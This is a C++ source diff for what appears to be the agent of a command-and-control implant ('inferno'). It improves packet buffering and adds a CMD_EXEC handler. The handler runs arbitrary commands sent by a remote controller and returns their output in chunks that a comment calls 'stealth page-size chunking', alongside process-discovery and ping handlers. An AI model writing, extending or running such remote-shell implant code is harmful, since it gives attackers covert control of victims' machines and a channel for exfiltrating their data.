@@ -84,16 +84,38 @@ void Agent::handleListening() {
         return;
     }
 
-    // Accumulate in member buffer
+    // Accumulate in member buffer (handles TCP fragmentation)
     m_receive_buffer.insert(m_receive_buffer.end(), buffer.begin(), buffer.end());
 
-    // Try to deserialize
-    auto packet_opt = ::inferno::Packet::deserialize(m_receive_buffer);
-    if (packet_opt.has_value()) {
+    // Sliding buffer loop: process ALL complete packets in the buffer
+    while (true) {
+        // Guard: need at least a full header to inspect
+        if (m_receive_buffer.size() < sizeof(PacketHeader)) break;
+
+        // Resync: peek at magic before calling deserialize().
+        // deserialize() returns nullopt for BOTH "incomplete data" and "invalid magic/checksum".
+        // Without this check, a single corrupted prefix byte causes an infinite stall.
+        const uint32_t magic =
+            (static_cast<uint32_t>(m_receive_buffer[0]) << 24) |
+            (static_cast<uint32_t>(m_receive_buffer[1]) << 16) |
+            (static_cast<uint32_t>(m_receive_buffer[2]) << 8)  |
+             static_cast<uint32_t>(m_receive_buffer[3]);
+
+        if (magic != 0xDEADBEEF) {
+            std::cerr << "[Agent] Buffer desync detected — discarding 1 byte to resync.\n";
+            m_receive_buffer.erase(m_receive_buffer.begin());
+            continue;
+        }
+
+        auto packet_opt = ::inferno::Packet::deserialize(m_receive_buffer);
+        if (!packet_opt.has_value()) {
+            break; // Incomplete packet — wait for more data
+        }
+        const size_t packet_size = sizeof(PacketHeader) + packet_opt->getPayload().size();
         handleDispatching(std::move(*packet_opt));
-        // Simple buffer cleanup (only works for 1 packet at a time right now)
-        // Future: Improve to handle multiple packets/partial packets properly
-        m_receive_buffer.clear(); 
+        // Slide: remove the consumed packet bytes from the front of the buffer
+        m_receive_buffer.erase(m_receive_buffer.begin(),
+                               m_receive_buffer.begin() + packet_size);
     }
 }
 
@@ -108,11 +130,66 @@ void Agent::handleDispatching(Packet&& packet) {
         m_socket.sendData(data);
     } else if (opcode == static_cast<uint16_t>(Opcode::PROC_LIST_REQ)) {
         handleProcessDiscovery();
+    } else if (opcode == static_cast<uint16_t>(Opcode::CMD_EXEC)) {
+        handleShellExecution(std::move(packet));
     } else if (opcode == static_cast<uint16_t>(Opcode::PING)) {
         Packet pong(static_cast<uint16_t>(Opcode::PONG), "");
         std::vector<uint8_t> data = pong.serialize();
         m_socket.sendData(data);
     }
+}
+
+void Agent::handleShellExecution(Packet&& packet) {
+    // 1. Deserialize the command from the payload
+    const auto& raw = packet.getPayload();
+    if (raw.size() < 2) {
+        std::cerr << "[Agent] CMD_EXEC: payload too short." << std::endl;
+        return;
+    }
+    const uint16_t cmd_len = (static_cast<uint16_t>(raw[0]) << 8) | raw[1];
+    if (raw.size() < static_cast<size_t>(2 + cmd_len)) {
+        std::cerr << "[Agent] CMD_EXEC: payload truncated." << std::endl;
+        return;
+    }
+    const std::string command(raw.begin() + 2, raw.begin() + 2 + cmd_len);
+    std::cout << "[Agent] Executing: " << command << std::endl;
+
+    // 2. Execute via ShellExecutor
+    const ShellExecutor::Result result = m_shell.execute(command);
+
+    // 3. Transmit output in 4096-byte chunks (stealth page-size chunking)
+    const std::string& output = result.output;
+    const size_t chunk_size   = ShellExecutor::CHUNK_SIZE;
+    const size_t total        = output.size();
+    size_t offset             = 0;
+
+    auto send_chunk = [&](uint8_t status, const std::string& data) {
+        std::vector<uint8_t> payload;
+        payload.push_back(status);
+        // Append data length (2 bytes, big-endian)
+        const uint16_t len = static_cast<uint16_t>(data.size());
+        payload.push_back(static_cast<uint8_t>((len >> 8) & 0xFF));
+        payload.push_back(static_cast<uint8_t>(len & 0xFF));
+        payload.insert(payload.end(), data.begin(), data.end());
+
+        Packet res(static_cast<uint16_t>(Opcode::CMD_RES),
+                   std::string(payload.begin(), payload.end()));
+        m_socket.sendData(res.serialize());
+    };
+
+    if (total == 0) {
+        // Send empty end-of-output immediately
+        send_chunk(1, "");
+        return;
+    }
+
+    do {
+        const size_t end   = std::min(offset + chunk_size, total);
+        const bool is_last = (end == total);
+        const uint8_t status = is_last ? 1 : 0;
+        send_chunk(status, output.substr(offset, end - offset));
+        offset = end;
+    } while (offset < total);
 }
 
 void Agent::handleProcessDiscovery() {
